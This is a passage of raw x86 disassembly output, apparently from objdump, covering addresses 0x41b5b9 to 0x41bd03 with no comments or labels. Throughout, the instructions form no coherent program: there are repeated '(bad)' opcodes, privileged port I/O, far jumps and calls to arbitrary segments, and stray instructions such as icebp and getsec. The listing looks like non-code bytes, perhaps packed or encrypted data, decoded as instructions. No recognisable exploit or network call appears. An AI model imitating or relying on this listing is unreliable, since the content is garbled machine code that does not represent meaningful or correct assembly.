  41b5b9:	clc    
  41b5ba:	mov    ch,0x8f
  41b5bc:	jg     0x41b5e7
  41b5be:	inc    ebx
  41b5bf:	inc    eax
  41b5c0:	retf   
  41b5c1:	test   al,0xce
  41b5c3:	mov    esi,0x2f37f610
  41b5c8:	jo     0x41b5cb
  41b5ca:	call   0x40b5:0x38c3ab5e
  41b5d1:	inc    ecx
  41b5d2:	sbb    al,0xda
  41b5d4:	fwait
  41b5d5:	lahf   
  41b5d6:	add    DWORD PTR [edi],edi
  41b5d8:	ret    0x325d
  41b5db:	add    al,0x65
  41b5dd:	inc    eax
  41b5de:	out    dx,al
  41b5df:	mov    ss,WORD PTR ds:0x3cbe5f23
  41b5e5:	jno    0x41b60d
  41b5e7:	je     0x41b57a
  41b5e9:	in     eax,dx
  41b5ea:	adc    al,0xfb
  41b5ec:	adc    ebx,DWORD PTR [eax+0x62ec03a3]
  41b5f2:	aad    0x36
  41b5f4:	sbb    DWORD PTR [esi],eax
  41b5f6:	xor    ch,BYTE PTR [esi]
  41b5f8:	test   DWORD PTR [edi],ebp
  41b5fa:	loop   0x41b5a6
  41b5fc:	sbb    DWORD PTR [esi+0x72],ecx
  41b5ff:	not    DWORD PTR [esi-0x5f0227dd]
  41b605:	scas   eax,DWORD PTR es:[edi]
  41b606:	adc    al,0x39
  41b608:	dec    eax
  41b609:	repz pop es
  41b60b:	outs   dx,DWORD PTR ds:[esi]
  41b60c:	lahf   
  41b60d:	retf   
  41b60e:	call   0xa692282a
  41b613:	push   ss
  41b614:	add    al,0xd8
  41b616:	push   0xbd482a39
  41b61b:	mov    esi,0x15dc41ec
  41b620:	mov    dh,0x33
  41b622:	sub    BYTE PTR ds:[ebx-0x5d],al
  41b626:	dec    ebp
  41b627:	pusha  
  41b628:	or     bl,bl
  41b62a:	push   edi
  41b62b:	in     eax,dx
  41b62c:	push   0x21
  41b62e:	inc    edx
  41b62f:	cmp    BYTE PTR [edx+0x78],bh
  41b632:	imul   ebp,edi,0x71
  41b635:	inc    edi
  41b636:	sbb    BYTE PTR [esi+edx*8+0x342b6e86],ah
  41b63d:	iret   
  41b63e:	pop    ebp
  41b63f:	aaa    
  41b640:	lods   al,BYTE PTR ds:[esi]
  41b641:	mov    al,ds:0x9a0efedb
  41b646:	pop    edi
  41b647:	pop    ebp
  41b648:	xor    BYTE PTR [ebx+0x5f],dh
  41b64b:	test   al,0xfa
  41b64d:	jmp    0xd4bc:0xafbfb9dd
  41b654:	ins    DWORD PTR es:[edi],dx
  41b655:	xchg   BYTE PTR [edx],dh
  41b657:	inc    ebp
  41b658:	inc    ebp
  41b659:	out    dx,eax
  41b65a:	jl     0x41b631
  41b65c:	sub    eax,0xe2b7ad7f
  41b661:	mov    al,ds:0x49369818
  41b666:	adc    ah,bl
  41b668:	loop   0x41b645
  41b66a:	add    ch,ah
  41b66c:	jnp    0x41b6e3
  41b66e:	add    ecx,ecx
  41b670:	sub    BYTE PTR [esp+ecx*2-0x62efe1ac],dh
  41b677:	imul   ebp,ebp,0xffffff9b
  41b67a:	loopne 0x41b66f
  41b67c:	push   ds
  41b67d:	push   esi
  41b67e:	inc    eax
  41b67f:	sub    DWORD PTR [eax+0x5c],edx
  41b682:	test   eax,0x1d64a9c7
  41b687:	mov    ecx,es
  41b689:	or     DWORD PTR [edx],0x3556b686
  41b68f:	fsub   QWORD PTR [edx+edi*1+0x5ed68a64]
  41b696:	imul   edx,ebx,0x60976796
  41b69c:	push   ecx
  41b69d:	push   ebx
  41b69e:	icebp  
  41b69f:	cmp    al,BYTE PTR [edi]
  41b6a1:	je     0x41b681
  41b6a3:	dec    edi
  41b6a4:	push   eax
  41b6a5:	int    0xba
  41b6a7:	push   eax
  41b6a8:	adc    bl,bh
  41b6aa:	(bad)  
  41b6ab:	neg    BYTE PTR [esi]
  41b6ad:	cmp    al,0xfe
  41b6af:	or     DWORD PTR [edx+0x5d],esi
  41b6b2:	and    DWORD PTR [esi+0x15],ebx
  41b6b5:	ret    0xf17a
  41b6b8:	sbb    DWORD PTR [edi+0x50],esp
  41b6bb:	xchg   ebx,eax
  41b6bc:	cdq    
  41b6bd:	sub    al,0xa3
  41b6bf:	rcl    BYTE PTR [edi],cl
  41b6c1:	dec    ebp
  41b6c2:	hlt    
  41b6c3:	aas    
  41b6c4:	shld   DWORD PTR ss:[ebp+0x1],esp,cl
  41b6c9:	and    eax,DWORD PTR [edi]
  41b6cb:	sar    BYTE PTR [eax-0x76],0x88
  41b6cf:	into   
  41b6d0:	sub    DWORD PTR [ecx+0x66bd64af],eax
  41b6d6:	cmp    esi,DWORD PTR [ebp-0x5c]
  41b6d9:	mov    ebp,0x323a2aff
  41b6de:	jb     0x41b728
  41b6e0:	mov    WORD PTR [ebx+0x3d],ss
  41b6e3:	cs int3 
  41b6e5:	(bad)  
  41b6e6:	(bad)  
  41b6e8:	mov    bl,0x66
  41b6ea:	stos   DWORD PTR es:[edi],eax
  41b6eb:	nop
  41b6ec:	or     al,0x2a
  41b6ee:	jo     0x41b737
  41b6f0:	jbe    0x41b6a7
  41b6f2:	dec    edx
  41b6f3:	push   ebx
  41b6f4:	or     DWORD PTR [edx],edi
  41b6f6:	inc    ebx
  41b6f7:	mov    ecx,0x1bd36e7d
  41b6fc:	std    
  41b6fd:	push   0xccde3cd6
  41b702:	aad    0x8
  41b704:	mov    bh,0x98
  41b706:	fst    DWORD PTR [esi-0x72d11d7a]
  41b70c:	popfw  
  41b70e:	mov    ah,0x33
  41b710:	ds inc edi
  41b712:	shl    BYTE PTR [esp+ebp*2-0x58],1
  41b716:	test   al,0x6f
  41b718:	add    eax,0x3a0e67b0
  41b71d:	int    0x15
  41b71f:	mov    ch,0xf6
  41b721:	and    DWORD PTR [esi-0x60],ebx
  41b724:	mov    esp,0xc585019d
  41b729:	dec    ecx
  41b72a:	mov    eax,ebx
  41b72c:	inc    esi
  41b72d:	(bad)  [edx+0x18e2eeca]
  41b733:	mul    DWORD PTR [ebx]
  41b735:	cmp    eax,0x5740d770
  41b73a:	mov    ecx,0xdcdd1fe5
  41b73f:	out    dx,al
  41b740:	mov    edx,0xe31a4936
  41b745:	push   es
  41b746:	cmp    BYTE PTR [ebx],dl
  41b748:	out    dx,eax
  41b749:	xchg   ebp,eax
  41b74a:	jl     0x41b775
  41b74c:	and    edi,esp
  41b74e:	adc    bh,0x8f
  41b751:	and    DWORD PTR [esp+eax*8-0x1a],edi
  41b755:	xor    eax,0xb4ac5c8e
  41b75a:	fdivr  DWORD PTR [edx]
  41b75c:	sbb    eax,0x66b2a021
  41b761:	das    
  41b762:	(bad)  
  41b763:	sbb    ch,BYTE PTR [edi-0x3b]
  41b766:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b767:	xor    bl,BYTE PTR [ebp+edx*8-0x3a701bed]
  41b76e:	xor    BYTE PTR [eax-0x2d],0xd9
  41b772:	ror    BYTE PTR [esi],cl
  41b774:	push   edx
  41b775:	add    dh,BYTE PTR [eax-0x5d9c807d]
  41b77b:	jecxz  0x41b703
  41b77d:	xchg   ebx,eax
  41b77e:	mov    cl,0x1d
  41b780:	cmp    eax,0xb2c161d5
  41b785:	stos   DWORD PTR es:[edi],eax
  41b786:	xor    DWORD PTR [esi-0x40e9dae2],edi
  41b78c:	shr    BYTE PTR [ecx+eax*2+0xf503b13],cl
  41b793:	inc    ebx
  41b794:	and    dl,bh
  41b796:	and    BYTE PTR [ecx+0x7c6f2290],0x5e
  41b79d:	ins    BYTE PTR es:[edi],dx
  41b79e:	aam    0x1
  41b7a0:	xor    DWORD PTR [eax],edx
  41b7a2:	or     eax,0x1eb2ea4e
  41b7a7:	jle    0x41b799
  41b7a9:	data16 clc 
  41b7ab:	push   esi
  41b7ac:	jp     0x41b7d1
  41b7ae:	push   ecx
  41b7af:	scas   eax,DWORD PTR es:[edi]
  41b7b0:	in     eax,dx
  41b7b1:	push   ebx
  41b7b2:	push   ss
  41b7b3:	mov    edi,es
  41b7b5:	jae    0x41b82b
  41b7b7:	pop    ebx
  41b7b8:	xchg   ebx,eax
  41b7b9:	mov    BYTE PTR [eax-0x12],ch
  41b7bc:	xchg   edi,eax
  41b7bd:	sbb    cl,BYTE PTR [esi]
  41b7bf:	test   DWORD PTR [edi],eax
  41b7c1:	cwde   
  41b7c2:	sub    eax,0x8bf2cb7d
  41b7c7:	add    BYTE PTR [esi+0x71],al
  41b7ca:	xor    eax,0x948a6455
  41b7cf:	mov    BYTE PTR [esi-0xd],dh
  41b7d2:	cwde   
  41b7d3:	xchg   edi,eax
  41b7d4:	nop
  41b7d5:	rol    DWORD PTR [ebx],0x5e
  41b7d8:	fild   WORD PTR [edi-0x37]
  41b7db:	inc    edx
  41b7dc:	push   esp
  41b7dd:	sbb    eax,0xb03b50de
  41b7e2:	push   es
  41b7e3:	ins    BYTE PTR es:[edi],dx
  41b7e4:	outs   dx,DWORD PTR ds:[esi]
  41b7e5:	adc    eax,0xa92d0df
  41b7ea:	ror    BYTE PTR [edx],cl
  41b7ec:	pop    ecx
  41b7ed:	pop    ds
  41b7ee:	add    esi,0xd3049c4c
  41b7f4:	sub    BYTE PTR es:[ebx-0x6f],bh
  41b7f8:	sub    eax,0xc6d6de49
  41b7fd:	sbb    eax,DWORD PTR [ebp-0xf]
  41b800:	sub    BYTE PTR ds:0x1cfdaa04,0xd2
  41b807:	cmp    BYTE PTR [eax+0x0],ch
  41b80a:	mov    al,0xed
  41b80c:	add    bl,ah
  41b80e:	retf   
  41b80f:	sub    al,0x57
  41b811:	jg     0x41b7ff
  41b813:	inc    ecx
  41b814:	ds inc ebp
  41b816:	and    bh,BYTE PTR [edx+0x11]
  41b819:	cmp    BYTE PTR ss:[eax],al
  41b81c:	addr16 jno 0x41b86e
  41b81f:	into   
  41b820:	outs   dx,DWORD PTR ds:[esi]
  41b821:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b822:	lds    esi,FWORD PTR [esp+ebp*1]
  41b825:	mov    al,ds:0x4c429ed7
  41b82a:	push   esi
  41b82b:	dec    edi
  41b82c:	mul    ah
  41b82e:	sbb    edx,DWORD PTR [ebx-0x67]
  41b831:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b832:	call   0x2854:0x255beb66
  41b839:	cdq    
  41b83a:	jns    0x41b841
  41b83c:	adc    al,0x46
  41b83e:	pandn  mm5,mm2
  41b841:	pop    ss
  41b842:	hlt    
  41b843:	aam    0xe9
  41b845:	clc    
  41b846:	push   ecx
  41b847:	and    DWORD PTR [ebp+esi*2-0x6c9c2b26],0x70
  41b84f:	(bad)  
  41b850:	inc    eax
  41b851:	in     eax,dx
  41b852:	getsec 
  41b854:	mov    dh,0xfe
  41b856:	test   al,0x7b
  41b858:	ins    BYTE PTR es:[edi],dx
  41b859:	sub    al,0xa
  41b85b:	stos   DWORD PTR es:[edi],eax
  41b85c:	pop    ss
  41b85d:	push   ebx
  41b85e:	out    0x4c,al
  41b860:	cwde   
  41b861:	pushf  
  41b862:	sbb    ecx,DWORD PTR [ecx-0x2ad763a3]
  41b868:	jne    0x41b8d4
  41b86a:	pop    ss
  41b86b:	jae    0x41b829
  41b86d:	push   esi
  41b86e:	ja     0x41b805
  41b870:	popa   
  41b871:	mov    al,0xc2
  41b873:	in     al,dx
  41b874:	dec    esp
  41b875:	dec    edx
  41b876:	xor    eax,0x745b9cd3
  41b87b:	into   
  41b87c:	sbb    bh,ah
  41b87e:	shr    ch,0x56
  41b881:	in     eax,0xf0
  41b883:	dec    ebp
  41b884:	loope  0x41b8d2
  41b886:	push   eax
  41b887:	out    0x10,eax
  41b889:	and    eax,0x36a7b240
  41b88e:	mov    ds:0x75bc35f0,eax
  41b893:	inc    ebp
  41b894:	jg     0x41b8da
  41b896:	push   cs
  41b897:	push   esi
  41b898:	and    dh,BYTE PTR [esi+edx*8+0x63]
  41b89c:	adc    ebx,esi
  41b89e:	push   0xffffffe9
  41b8a0:	pop    ebx
  41b8a1:	adc    dh,BYTE PTR [edx+edx*2-0xd]
  41b8a5:	addr16 (bad) 
  41b8a7:	xchg   edi,eax
  41b8a8:	test   eax,0xedf1e9fc
  41b8ad:	pop    ebp
  41b8ae:	jbe    0x41b8b2
  41b8b0:	inc    ecx
  41b8b1:	test   eax,0x30a784ee
  41b8b6:	pop    esi
  41b8b7:	das    
  41b8b8:	idiv   BYTE PTR [edi-0x41e0c06c]
  41b8be:	(bad)  
  41b8bf:	cmp    bh,BYTE PTR [edi-0x7029df7c]
  41b8c5:	out    dx,al
  41b8c6:	int    0x6a
  41b8c8:	nop
  41b8c9:	cdq    
  41b8ca:	addr16 mov ds:0x6438,eax
  41b8ce:	in     al,0x38
  41b8d0:	or     ebx,0x2b0b9b44
  41b8d6:	loopne 0x41b904
  41b8d8:	cmc    
  41b8d9:	pop    dx
  41b8db:	adc    ebp,DWORD PTR [edi-0xd]
  41b8de:	ss push ecx
  41b8e0:	(bad)  
  41b8e2:	inc    ebx
  41b8e3:	into   
  41b8e4:	sti    
  41b8e5:	iret   
  41b8e6:	popa   
  41b8e7:	addr16 push esi
  41b8e9:	ins    BYTE PTR es:[edi],dx
  41b8ea:	mov    esi,0xd10ad82d
  41b8ef:	inc    edx
  41b8f0:	sbb    DWORD PTR [ebx],ecx
  41b8f2:	push   0x4f
  41b8f4:	mov    ch,BYTE PTR [edi+0x2e]
  41b8f7:	fwait
  41b8f8:	int    0x9e
  41b8fa:	adc    ecx,DWORD PTR [edx]
  41b8fc:	inc    edx
  41b8fd:	rol    DWORD PTR [esi+0x3b2c7871],0x38
  41b904:	xor    ebp,esi
  41b906:	fisubr DWORD PTR ds:[eax+0x762c548]
  41b90d:	pop    esi
  41b90e:	sbb    DWORD PTR [edx+0x1e5b53f2],0x39
  41b915:	cwde   
  41b916:	ins    BYTE PTR es:[edi],dx
  41b917:	pop    ss
  41b918:	push   0xffffffce
  41b91a:	mov    BYTE PTR [ecx-0xc],bl
  41b91d:	adc    edx,ebx
  41b91f:	add    eax,0x3e29406c
  41b924:	jmp    0x6b61:0x4400d6d8
  41b92b:	pop    es
  41b92c:	inc    BYTE PTR [ebx+0x7bf3c4e4]
  41b932:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b933:	stos   BYTE PTR es:[edi],al
  41b934:	adc    BYTE PTR [ebp+0xfda256d],0xe8
  41b93b:	adc    ecx,edx
  41b93d:	mov    ds:0xab1b615b,eax
  41b942:	cmp    ecx,DWORD PTR [ebp+0x46724475]
  41b948:	xchg   edx,eax
  41b949:	jp     0x41b907
  41b94b:	into   
  41b94c:	aaa    
  41b94d:	adc    BYTE PTR [esi+0x44],bh
  41b950:	mov    esp,0xfd15d40e
  41b955:	cmp    al,0xf3
  41b957:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b958:	xchg   esi,eax
  41b959:	inc    dl
  41b95b:	mov    ah,0xd8
  41b95d:	xor    esi,ecx
  41b95f:	push   ebp
  41b960:	ret    
  41b961:	jbe    0x41b927
  41b963:	stc    
  41b964:	push   esp
  41b965:	in     al,0xea
  41b967:	clc    
  41b968:	in     al,0xe8
  41b96a:	mov    es,WORD PTR [edi-0x1f]
  41b96d:	mov    dh,0xe7
  41b96f:	inc    esp
  41b970:	shl    ah,cl
  41b972:	fistp  QWORD PTR [ebp+0x5b]
  41b975:	cwde   
  41b976:	mov    esi,0x243c9d45
  41b97b:	scas   eax,DWORD PTR es:[edi]
  41b97c:	rcr    BYTE PTR [ebx+0x3a47bc6],1
  41b982:	mov    bl,BYTE PTR [edi+0x4370b776]
  41b988:	mov    dh,0x5f
  41b98a:	push   cs
  41b98b:	test   BYTE PTR [esi],al
  41b98d:	cmp    eax,esi
  41b98f:	call   0x3274:0xa2b3c8f4
  41b996:	xchg   edi,eax
  41b997:	stos   DWORD PTR es:[edi],eax
  41b998:	je     0x41b983
  41b99a:	ret    0x508e
  41b99d:	stc    
  41b99e:	lahf   
  41b99f:	adc    eax,0x9862dcd2
  41b9a4:	inc    ebp
  41b9a5:	shl    ebx,1
  41b9a7:	xor    cl,BYTE PTR [esi]
  41b9a9:	jecxz  0x41ba15
  41b9ab:	repnz scas al,BYTE PTR es:[di]
  41b9ae:	outs   dx,BYTE PTR ds:[esi]
  41b9af:	sti    
  41b9b0:	repz xchg ebx,eax
  41b9b2:	out    dx,al
  41b9b3:	in     eax,dx
  41b9b4:	dec    esi
  41b9b5:	sbb    dl,BYTE PTR [ebp+0x6a]
  41b9b8:	pop    ebx
  41b9b9:	pop    esi
  41b9ba:	scas   eax,DWORD PTR es:[edi]
  41b9bb:	pop    es
  41b9bc:	push   0x2a3fe0a6
  41b9c1:	(bad)  
  41b9c2:	and    BYTE PTR [ebx],dh
  41b9c4:	add    cl,dl
  41b9c6:	mov    bh,BYTE PTR [eax]
  41b9c8:	sub    DWORD PTR [ecx-0x1e],0xffffffc4
  41b9cc:	retf   
  41b9cd:	call   0x6ccf:0x5d4a838d
  41b9d4:	xor    ebp,esp
  41b9d6:	mov    dl,0x5b
  41b9d8:	inc    ebx
  41b9d9:	xchg   ebp,eax
  41b9da:	(bad)
  41b9de:	xchg   edx,eax
  41b9df:	nop
  41b9e0:	out    0x6c,eax
  41b9e2:	cmp    edx,DWORD PTR [ecx-0x7e64db38]
  41b9e8:	jae    0x41ba22
  41b9ea:	inc    edx
  41b9eb:	aas    
  41b9ec:	jecxz  0x41ba43
  41b9ee:	out    0x59,eax
  41b9f0:	lods   ax,WORD PTR ds:[esi]
  41b9f2:	fiadd  WORD PTR [ecx-0x4ea440f4]
  41b9f8:	cwde   
  41b9f9:	data16 ror BYTE PTR [edi+0x33],1
  41b9fd:	mov    ecx,0x68a11d32
  41ba02:	outs   dx,DWORD PTR ds:[esi]
  41ba03:	jle    0x41ba2a
  41ba05:	jmp    0x67d03e58
  41ba0a:	fstp   TBYTE PTR [ecx-0x61520de]
  41ba10:	xchg   edx,eax
  41ba11:	jge    0x41ba1a
  41ba13:	mov    edx,0x434b322c
  41ba18:	mov    edi,0x8f72a85d
  41ba1d:	mov    ebp,0x1186db1a
  41ba22:	cmp    BYTE PTR [edi+0x50a3ec20],ah
  41ba28:	gs jg  0x41ba02
  41ba2b:	nop
  41ba2c:	or     esi,DWORD PTR [ebx-0x882156f]
  41ba32:	mov    eax,0x918a1df9
  41ba37:	xchg   ecx,eax
  41ba38:	mov    edx,0x6802f4ad
  41ba3d:	dec    eax
  41ba3e:	sub    BYTE PTR ds:[edi-0x79],0x44
  41ba43:	push   ebp
  41ba44:	faddp  st(6),st
  41ba46:	and    DWORD PTR [esi+ecx*8-0x6e05a4ec],ecx
  41ba4d:	inc    ecx
  41ba4e:	xor    cl,BYTE PTR fs:[edx+0x0]
  41ba52:	cmp    eax,0xda3e9cb3
  41ba57:	cmp    BYTE PTR [ecx-0xe01846a],ah
  41ba5d:	aam    0x9b
  41ba5f:	sti    
  41ba60:	sbb    al,0x32
  41ba62:	scas   eax,DWORD PTR es:[edi]
  41ba63:	xchg   esi,eax
  41ba64:	push   cs
  41ba65:	add    al,0xbc
  41ba67:	cmp    eax,0xf4bc7e12
  41ba6c:	push   ebp
  41ba6d:	or     BYTE PTR [edx],bh
  41ba6f:	cmc    
  41ba70:	out    0x8c,al
  41ba72:	push   edx
  41ba73:	test   DWORD PTR [edx],esi
  41ba75:	sbb    ecx,esp
  41ba77:	rcl    esp,cl
  41ba79:	xor    DWORD PTR [ecx+ebx*4],0xce637810
  41ba80:	add    eax,0xd249d219
  41ba85:	mov    ecx,0x6dae87ac
  41ba8a:	rcr    DWORD PTR [ecx],0x62
  41ba8d:	pushf  
  41ba8e:	out    0x88,al
  41ba90:	inc    edi
  41ba91:	sub    BYTE PTR [ebx-0x4a94720d],dh
  41ba97:	aas    
  41ba98:	cmp    esi,DWORD PTR [eax+0x2e3a7338]
  41ba9e:	mov    cl,ah
  41baa0:	fidiv  DWORD PTR [ebp+ebx*8+0xc]
  41baa4:	cld    
  41baa5:	jae    0x41ba8c
  41baa7:	es enter 0xeb98,0x9d
  41baac:	(bad)  
  41baad:	std    
  41baae:	adc    al,BYTE PTR [ebp-0x3166f3d0]
  41bab4:	sbb    cl,BYTE PTR [ebp+eiz*1-0x55]
  41bab8:	mov    ch,0xab
  41baba:	xchg   eax,edi
  41babc:	test   al,0xd8
  41babe:	mov    ecx,0x70706ef9
  41bac3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bac4:	inc    ebp
  41bac5:	jmp    0x41ba6e
  41bac7:	xor    eax,esi
  41bac9:	das    
  41baca:	lods   eax,DWORD PTR ds:[esi]
  41bacb:	jecxz  0x41bafe
  41bacd:	popf   
  41bace:	pop    esi
  41bacf:	and    DWORD PTR [ebx],edx
  41bad1:	push   edx
  41bad2:	xchg   edi,eax
  41bad3:	xchg   DWORD PTR [ebp-0x6],esp
  41bad6:	fsubrp st(0),st
  41bad8:	mov    al,ds:0x5af17c90
  41badd:	into   
  41bade:	fimul  DWORD PTR [esi-0x23]
  41bae1:	(bad)  
  41bae2:	arpl   WORD PTR [ecx*4+0x150ab60b],di
  41bae9:	scas   eax,DWORD PTR es:[edi]
  41baea:	add    ebp,DWORD PTR [edi-0xf]
  41baed:	(bad)  
  41baef:	or     al,0xfb
  41baf1:	mov    eax,0xbbfa94c7
  41baf6:	scas   al,BYTE PTR es:[edi]
  41baf7:	aas    
  41baf8:	cli    
  41baf9:	loop   0x41bafb
  41bafb:	dec    esi
  41bafc:	repnz sbb al,0x78
  41baff:	les    ecx,FWORD PTR [ecx+0x118ecfe3]
  41bb05:	(bad)
  41bb08:	mov    ch,0x43
  41bb0a:	jne    0x41bb20
  41bb0c:	inc    eax
  41bb0d:	mov    cl,0xfa
  41bb0f:	xchg   edx,eax
  41bb10:	xchg   BYTE PTR [eax],dh
  41bb12:	pop    edx
  41bb13:	jp     0x41bb02
  41bb15:	mov    bl,0x41
  41bb17:	gs (bad) 
  41bb19:	js     0x41ba9b
  41bb1b:	add    eax,0x524237d0
  41bb20:	xor    bh,BYTE PTR [ebx+edi*8-0x61a0cdee]
  41bb27:	lahf   
  41bb28:	or     BYTE PTR [edx-0x3e],cl
  41bb2b:	push   ebx
  41bb2c:	leave  
  41bb2d:	jmp    0x41bb62
  41bb2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bb30:	xchg   esp,eax
  41bb31:	test   BYTE PTR [ebx-0x2cce5254],dh
  41bb37:	std    
  41bb38:	jmp    0xb56a:0xd4a1a517
  41bb3f:	or     DWORD PTR ds:0x538834ae,edx
  41bb45:	adc    al,0x24
  41bb47:	lock xchg esp,eax
  41bb49:	js     0x41bade
  41bb4b:	xor    eax,0x4a20f795
  41bb50:	add    BYTE PTR [esi],0xb5
  41bb53:	push   ebp
  41bb54:	fwait
  41bb55:	jno    0x41bb9d
  41bb57:	pop    eax
  41bb58:	sbb    cl,dh
  41bb5a:	adc    dh,BYTE PTR [edx+0x4]
  41bb5d:	pop    ss
  41bb5e:	pushf  
  41bb5f:	imul   eax,DWORD PTR [edi+0x7d0c29ee],0x54
  41bb66:	jne    0x41bb6f
  41bb68:	xchg   BYTE PTR [edx],bh
  41bb6a:	sbb    ah,BYTE PTR [edi+0x64945be0]
  41bb70:	mov    al,0xcf
  41bb72:	xlat   BYTE PTR ds:[ebx]
  41bb73:	cdq    
  41bb74:	push   eax
  41bb75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bb76:	sbb    BYTE PTR ds:0x88491cea,0x62
  41bb7d:	mov    bh,0xc7
  41bb7f:	jbe    0x41bb8d
  41bb81:	adc    ah,BYTE PTR [edi+0x70513565]
  41bb87:	call   DWORD PTR [ebx]
  41bb89:	mov    bh,0x22
  41bb8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bb8c:	jmp    0xf858b036
  41bb91:	push   ss
  41bb92:	xlat   BYTE PTR ds:[ebx]
  41bb93:	jne    0x41bb37
  41bb95:	sub    ebx,esi
  41bb97:	or     esp,ebx
  41bb99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bb9a:	mov    dl,0x35
  41bb9c:	push   es
  41bb9d:	mov    ds:0x9cdc48ed,al
  41bba2:	cdq    
  41bba3:	and    bh,bl
  41bba5:	inc    ebp
  41bba6:	pushf  
  41bba7:	pop    ebp
  41bba8:	push   ebx
  41bba9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bbaa:	push   edi
  41bbab:	push   esp
  41bbac:	test   DWORD PTR [ebx-0x5bdde577],ebx
  41bbb2:	mov    eax,0xeda59bbd
  41bbb7:	add    al,0x72
  41bbb9:	outs   dx,DWORD PTR ds:[esi]
  41bbba:	dec    edi
  41bbbb:	cmc    
  41bbbc:	inc    ecx
  41bbbd:	jbe    0x41bc06
  41bbbf:	lea    ebx,[esi-0x69]
  41bbc2:	das    
  41bbc3:	and    al,0x36
  41bbc5:	mov    eax,0xc1820bbb
  41bbca:	repz sub bh,BYTE PTR [ebx-0x42]
  41bbce:	or     ax,0x633b
  41bbd2:	and    ch,BYTE PTR [edx+ebx*8+0x7e]
  41bbd6:	sbb    bh,ch
  41bbd8:	push   esp
  41bbd9:	inc    ecx
  41bbda:	mov    eax,0xf26d483d
  41bbdf:	icebp  
  41bbe0:	push   edx
  41bbe1:	test   al,0x9f
  41bbe3:	out    0x5e,eax
  41bbe5:	popa   
  41bbe6:	jmp    0xbb4:0x2cf095bf
  41bbed:	push   edx
  41bbee:	stc    
  41bbef:	push   0x39
  41bbf1:	sub    al,BYTE PTR [ecx+edx*1-0x74879093]
  41bbf8:	or     eax,DWORD PTR [ebx-0x69]
  41bbfb:	mov    ebx,0x697a3265
  41bc00:	fcom   QWORD PTR [edi+0x1cd1902c]
  41bc06:	mov    ?,WORD PTR [esi-0x1378ccad]
  41bc0c:	rol    BYTE PTR [esi+0x17],1
  41bc0f:	sbb    eax,0xe9081c14
  41bc14:	nop
  41bc15:	sub    BYTE PTR [esi],cl
  41bc17:	fxam   
  41bc19:	mov    ebx,0xad76289
  41bc1e:	cmp    esp,DWORD PTR [edx]
  41bc20:	mov    esp,0x404b16d1
  41bc25:	adc    BYTE PTR [eax+ecx*1+0x5a01c95d],bl
  41bc2c:	(bad)  
  41bc2d:	leave  
  41bc2e:	test   eax,0x9aaa9bbf
  41bc33:	dec    esp
  41bc34:	test   DWORD PTR [edi],0x52434e5b
  41bc3a:	or     eax,0x3dfddcb0
  41bc3f:	xchg   edx,eax
  41bc40:	mov    bl,0xb5
  41bc42:	pusha  
  41bc43:	mov    ds,WORD PTR [edx+0x36]
  41bc46:	cmp    al,0xa7
  41bc48:	int    0xc6
  41bc4a:	add    ebp,edx
  41bc4c:	xor    ebx,DWORD PTR [edx]
  41bc4e:	dec    esi
  41bc4f:	popa   
  41bc50:	jmp    0xddc75e3f
  41bc55:	hlt    
  41bc56:	pop    edx
  41bc57:	jno    0x41bc25
  41bc59:	pop    eax
  41bc5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc5b:	das    
  41bc5c:	cmp    eax,0x940b5ea
  41bc61:	xchg   ebp,eax
  41bc62:	cmp    DWORD PTR [edx+0x54ed1acb],ebx
  41bc68:	not    DWORD PTR [edi]
  41bc6a:	js     0x41bcb2
  41bc6c:	jecxz  0x41bccf
  41bc6e:	pop    ebp
  41bc6f:	popf   
  41bc70:	push   ds
  41bc71:	and    eax,0x54a2a317
  41bc76:	test   eax,0x682903db
  41bc7b:	sub    bh,cl
  41bc7d:	jecxz  0x41bcd2
  41bc7f:	and    bh,BYTE PTR [esi+0x499720cd]
  41bc85:	inc    esp
  41bc86:	rol    DWORD PTR [edi-0x2a],0xeb
  41bc8a:	mov    ds:0x6c35bfc,al
  41bc8f:	xor    ah,BYTE PTR [edi]
  41bc91:	jg     0x41bcc7
  41bc93:	sbb    eax,0x10fd7e16
  41bc98:	mov    ch,0x98
  41bc9a:	out    dx,eax
  41bc9b:	test   BYTE PTR [edi],bl
  41bc9d:	ret    0xd7f
  41bca0:	in     eax,0x14
  41bca2:	scas   eax,DWORD PTR es:[edi]
  41bca3:	pop    esi
  41bca4:	push   esp
  41bca5:	dec    ebp
  41bca6:	adc    BYTE PTR [ecx+0x20],dh
  41bca9:	ja     0x41bcbf
  41bcab:	out    dx,eax
  41bcac:	rcl    ecx,0xf1
  41bcaf:	cmp    dl,BYTE PTR [ebx-0x295c756c]
  41bcb5:	scas   eax,DWORD PTR es:[edi]
  41bcb6:	test   esi,esp
  41bcb8:	jmp    0xd2d2:0x595116f8
  41bcbf:	cld    
  41bcc0:	fwait
  41bcc1:	jle    0x41bce7
  41bcc3:	(bad)  
  41bcc4:	ds pop ebx
  41bcc6:	inc    eax
  41bcc7:	mov    al,0x26
  41bcc9:	add    cl,BYTE PTR [edx+0x7488d9ba]
  41bccf:	cmp    eax,ebx
  41bcd1:	pusha  
  41bcd2:	or     ch,ch
  41bcd4:	les    esp,FWORD PTR [edi]
  41bcd6:	std    
  41bcd7:	out    dx,eax
  41bcd8:	nop
  41bcd9:	cmp    eax,eax
  41bcdb:	popf   
  41bcdc:	mov    al,0x7d
  41bcde:	adc    eax,0xd2d5a11e
  41bce3:	pop    ebp
  41bce4:	cli    
  41bce5:	mov    eax,0x93e49387
  41bcea:	push   0xffffffd4
  41bcec:	repnz and edi,DWORD PTR [ebx+0x31]
  41bcf0:	shl    BYTE PTR [ecx-0x7b904f41],0xd5
  41bcf7:	pop    edi
  41bcf8:	sbb    ecx,esi
  41bcfa:	inc    ebp
  41bcfb:	or     bl,al
  41bcfd:	dec    ecx
  41bcfe:	in     al,dx
  41bcff:	data16 adc cl,BYTE PTR [ebp-0x41]
  41bd03:	and    al,0x56
